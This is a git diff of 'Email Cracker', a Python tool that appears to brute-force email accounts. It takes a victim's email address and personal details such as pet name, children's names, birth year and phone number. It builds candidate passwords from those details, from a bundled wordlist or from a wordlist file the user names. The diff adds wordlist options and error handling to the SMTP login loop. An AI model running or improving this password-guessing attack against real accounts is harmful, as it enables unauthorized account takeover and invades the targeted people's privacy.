@@ -42,7 +42,7 @@ success=f"{purple}[{stop}√{purple}]{green} "
 first= f"{green}[{stop}01{green}]{purple} "
 second= f"{green}[{stop}02{green}]{purple} "
 third= f"{green}[{stop}03{green}]{purple} "
-version="2.8.0"
+version="2.9.0"
 
 
 def slow2(y):
@@ -96,28 +96,30 @@ def load(y):
 
 def internet():
     try:
-        s = socket.socket(socket.AF_NET, socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect_ex(("www.google.com",80))
         return True
     except Exception:return False
     
 
-def aboutus():
+def aboutus(): 
     os.system("clea" + "r || cls")
     granted()
 
     slowbr(f'\t{info2}Tool Name      {blue}:>>{purple}  Email Cracker')
     slowbr(f'\t{info2}Version        {blue}:>>{purple}  v[{version[:-2]}]')
     slowbr(f'\t{info2}Author         {blue}:>>{purple}  evilfeonix')
-    slowbr(f'\t{info2}Github         {blue}:>>{purple}  Evil {red}FeoniX')
-    slowbr(f'\t{info2}Youtube        {blue}:>>{purple}  Evil {red}FeoniX')
-    slowbr(f'\t{info2}Latest Update  {blue}:>>{purple}  31-12-2024')
+    slowbr(f'\t{info2}Github         {blue}:>>{purple}  Digital Firebird')
+    slowbr(f'\t{info2}Youtube        {blue}:>>{purple}  Digital Firebird')
+    slowbr(f'\t{info2}Latest Update  {blue}:>>{purple}  30 - 01 - 2025')
     slowbr(f'\t{info2}Website        {blue}:>>{purple}  www.evilfeonix.com{red}')
 
     slowbr("===========================================================")
     slowbr("")
     act=input(f'{add}Press {purple}[{stop}ENTER{purple}]{yellow} To Continue')
-    return main()
+    
+    main()
+    # return main()
 
 def granted():
     logo=f"""{green}
@@ -146,15 +148,7 @@ def banner(password,ban):
     else:return bannerThree
     
 
-def get_info():
-    os.system("clear || cls")
-    slowbr(banner(password,ban="1"))
-    mail=input(f"{add}Victim's Email Addr: {purple}")
-    time.sleep(2)
-
-    os.system("clear || cls")
-    slowbr(banner(password,ban="1"))
-
+def get_info2():
     pet=input(f"{add}Victim's Pet Name: {purple}")
     father=input(f"{add}Victim's Son Name: {purple}")
     name=input(f"{add}Victim's First Name: {purple}")
@@ -162,24 +156,94 @@ def get_info():
     year=input(f"{add}Victim's Year-of-Birth: {purple}")
     phone=input(f"{add}Victim's Phone Number: {purple}")
 
-    victim.append(mail),infoga.append(pet),infoga.append(year),infoga.append(name)
+    infoga.append(pet),infoga.append(year),infoga.append(name)
     infoga.append(nnnm),infoga.append(father),infoga.append(phone),time.sleep(2)
-    
+
+    while True:
+        Do = input(f"{add} Add additional information {stop}[{green}Y{stop}/{green}n{stop}]{stop}:{blue} ")
+
+        if not Do.lower() in ['y', 'yes', 'n', 'no']:
+            slowbr(f"{err} Invalid Option!{stop}")
+            os.sys.exit(1)
+        if not Do.lower() in ['y', 'yes']:
+            break
+
+        additional = input(f"{add} Enter Extra Information:{blue} ")
+        infoga.append(additional)
+
+def get_info():
+    os.system("clear || cls")
+    slowbr(banner(password,ban="1"))
+    slowbr(f"{first} Used our Wordlist")
+    slowbr(f"{second} Generate your Wordlist")
+    slowbr(f"{third} Nevigate to exitting Wordlist")
+    method=input(f"\n{add}Chooce Which Method to Used: {purple}")
+
+    os.system("clear || cls")
+    slowbr(banner(password,ban="1"))
+    mail=input(f"{add}Victim's Email Addr: {purple}")
+    victim.append(mail)
+    time.sleep(2)
+
+    os.system("clear || cls")
+    slowbr(banner(password,ban="1"))
+
+    if method in ['01','1']:
+        pass
+    elif method in ['02','2']:
+        get_info2()
+    elif method in ['03','3']:
+        pass
+    else:
+        slowbr(f"{error}Invalid Wordlist Method")
+
+    return method
 
 def pwdGen(argument):
-    get_info()
-    for a in range(0, len(infoga)):
-        comb=combinations(infoga, a+1)
-        for set in list(comb):
-            pwdLen=0
-            for b in set:pwdLen+=len(b)
-            if argument.minLen<=pwdLen<=argument.maxLen:
-                perm=permutations(set)
-                for c in list(perm):
-                    pwd=("")
-                    for d in range(0,len(c)):pwd+=c[d]
-                    if pwd in password:continue 
-                    else:password.append(pwd)
+    method=get_info()
+
+    if method in ['01','1']:
+        try:
+            with open('passwords.txt','r') as wordlist:
+                pass
+        except FileNotFoundError:
+            slowbr(f"{error}passwords.txt is missing!")
+            os.sys.exit()
+
+        with open('passwords.txt') as wordlist:
+            pswds = wordlist.readlines()
+            for p in pswds:
+                p = p.strip()
+                password.append(p)
+
+    elif method in ['02','2']:
+        for a in range(0, len(infoga)):
+            comb=combinations(infoga, a+1)
+            for set in list(comb):
+                pwdLen=0
+                for b in set:pwdLen+=len(b)
+                if argument.minLen<=pwdLen<=argument.maxLen:
+                    perm=permutations(set)
+                    for c in list(perm):
+                        pwd=("")
+                        for d in range(0,len(c)):pwd+=c[d]
+                        if pwd in password:continue 
+                        else:password.append(pwd)
+
+    else:
+        wordlist=input(f"{add}Enter Path To Wordlist File: {purple}")
+        try:
+            with open(wordlist,'r') as wordlist:
+                pass
+        except FileNotFoundError:
+            slowbr(f"{error}{wordlist} Does not Exist!")
+            os.sys.exit()
+
+        with open(wordlist,'r') as wordlist:
+            pswds = wordlist.readlines()
+            for p in pswds:
+                p = p.strip()
+                password.append(p)
                
 
 def cracker(argument):
@@ -189,7 +253,8 @@ def cracker(argument):
     if len(password)==0:
         slowbr(banner(password,ban="3"))
         slowbr(f"{error}We Are Unable To Generate Password!,{stop}")
-        slowbr(f"{notice}Please Provide Atlease 2 Or More Information,{stop}")
+        slowbr(f"{notice}IF you are using your provided wordlist,{stop}")
+        slowbr(f"{notice}Please Ensure it contains Atlease 2 Or More words,{stop}")
         slowbr(f"{notice}In Order To Avoid This Error.{stop}")
         os.sys.exit()
         
@@ -198,10 +263,13 @@ def cracker(argument):
     slowbr("")
 
     slow(f"{notice}Pleace Wait!, Starting SMTP Server{stop}"),load('')
-    smtpObj = smtplib.SMTP_SSL(SMTPhost,SMTPport)
-    smtpObj.ehlo()
+    try:
+        smtpObj = smtplib.SMTP_SSL(SMTPhost,SMTPport)
+        smtpObj.ehlo()
+    except TimeoutError:slowbr(f"{error}Connection Faild, Timeout!")
+    except ConnectionAbortedError:slowbr(f"{error}Look like You're out of data!")
     # smtpObj.starttls()
-    time.sleep(1)
+    # time.sleep(1)
     index=0
 
     mail=victim[0]
@@ -256,6 +324,7 @@ def main():
     os.system("clear || cls"),granted()
 
     net=internet()
+    # if net:
     if not net:
         time.sleep(1)
         slow(f"\n{error}Please Check Your Internet Connection{stop}")
